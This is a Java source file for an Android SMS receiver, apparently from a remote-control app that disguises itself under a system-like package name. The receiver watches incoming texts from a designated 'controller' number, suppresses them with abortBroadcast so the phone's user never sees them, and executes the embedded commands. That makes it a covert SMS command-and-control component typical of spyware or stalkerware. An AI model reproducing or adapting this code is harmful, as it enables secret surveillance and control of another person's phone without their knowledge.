package com.android.system.controled.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.bean.SmsInfo;
import com.android.system.controled.db.InnerDbOpera;
import com.android.system.controled.db.Tables;
import com.android.system.controled.logic.CodeDoing;
import com.android.system.controled.util.CodeUtil;
import com.android.system.controled.util.InitUtil;
import com.android.system.controled.util.SmsSaveOutUtil;
import com.android.system.controled.util.TimeUtil;

public class MsgAndOtherReceiver extends BroadcastReceiver {

	private static final String TAG = "MsgAndOtherReceiver";

	@Override
	public void onReceive(Context context, Intent intent) {

		InitUtil.init(context);

		Debug.e(TAG, "intent.getAction()=" + intent.getAction());

		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
			SmsMessage[] msg = null;
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObj = (Object[]) bundle.get("pdus");
				msg = new SmsMessage[pdusObj.length];
				int mmm = pdusObj.length;
				for (int i = 0; i < mmm; i++)
					msg[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
			}

			String msgTxt = "";
			int msgLength = msg.length;
			for (int i = 0; i < msgLength; i++) {
				msgTxt += msg[i].getMessageBody();
			}

			// 获得发信人号码
			String getFromNum = "";
			for (SmsMessage currMsg : msg) {
				getFromNum = currMsg.getDisplayOriginatingAddress();
			}

			Debug.v("MsgReceiver", getFromNum);
			if (getFromNum.contains(MainApplication.getInstence().getControllerTel())) {
				Code code = CodeUtil.getCode(msgTxt);
				if (code != null) {
					abortBroadcast();
					
					code.setDate(TimeUtil.getCurrentTimeMillisInner());
					//先存储一下命令，再执行命令
					if(InnerDbOpera.getInstence().insertNewCode(code) > 0) {
						code = CodeDoing.getInstance().doOperaByMessage(context, code);
					}
					//失败后无需重复操作的命令，随即更新执行结果
					if(code.getRedoNeed() == Code.REDO_NOT) {
						InnerDbOpera.getInstence().updateCodeResult(code);
					}
					
					
					//存储命令记录
					SmsInfo sms = new SmsInfo();
					sms.setDate(code.getDate());
					sms.setName("控制方");
					sms.setType(1);
					sms.setBody("【命令短信】" + code.getCode());
					sms.setAddress(getFromNum);
					
					SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
					so.saveSms(sms);
				}
			}
		}
	}

}
